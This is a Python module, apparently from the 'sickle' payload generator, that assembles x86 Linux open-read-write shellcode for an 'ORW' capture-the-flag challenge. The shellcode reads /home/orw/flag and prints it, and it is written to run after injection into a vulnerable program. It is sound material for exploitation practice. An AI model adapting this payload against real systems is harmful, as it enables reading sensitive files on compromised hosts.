import sys

from sickle.common.lib.reversing import mappings

from sickle.common.lib.reversing.assembler import Assembler

class Shellcode():

    arch = "x86"

    platform = "linux"

    name = f"Linux ({arch}) ORW Challenge Shellcode"

    module = f"{platform}/{arch}/orw"

    example_run = f"{sys.argv[0]} -p {module} -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Ubuntu 16.04.1 LTS"]

    summary = ("Cat's the flag to complete ORW challenge")

    description = ("Cat's the flag to complete ORW challenge")

    arguments = None

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.syscalls = mappings.get_linux_syscalls(["open",
                                                     "read",
                                                     "write",
                                                     "exit"])

    def generate_source(self):
        """Returns assembly source code for the main functionality of the stub
        """

        source_code = f"""
start:
    ; pushes "/home/orw/flag\0" onto the stack
    xor eax, eax
    push eax
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp    ; place pointer to filename into EBX
open_fd:
    ; int open(const char *pathname, int flags);
    xor eax,eax                     ; zero out EAX for MOV instruction
    mov al, {self.syscalls['open']}
    xor ecx,ecx                     ; zero out ECX (O_RDONLY == 00)
    int 0x80
read_fd:
    ; ssize_t read(int fd, void *buf, size_t count);
    xor ebx,ebx
    mov bl,al                       ; MOV FD into EBX
    xor eax,eax
    mov al, {self.syscalls['read']}
    mov ecx,esp                     ; *buf -> stack
    xor edx,edx
    add dl,0xff
    int 0x80
write_fd:
    xor ebx,ebx
    mov bl,1                        ; write to FD(1 == STDOUT)
    mov ecx,esp                     ; *buf (stored on stack by read())
    mov edx,eax                     ; length of the buffer (returned by read())
    mov al,{self.syscalls['write']}
    int 0x80
exit:
    xor eax,eax
    mov al,{self.syscalls['exit']}
    mov bl,al
    int 0x80
        """

        return source_code

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)
        src = self.generate_source()

        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
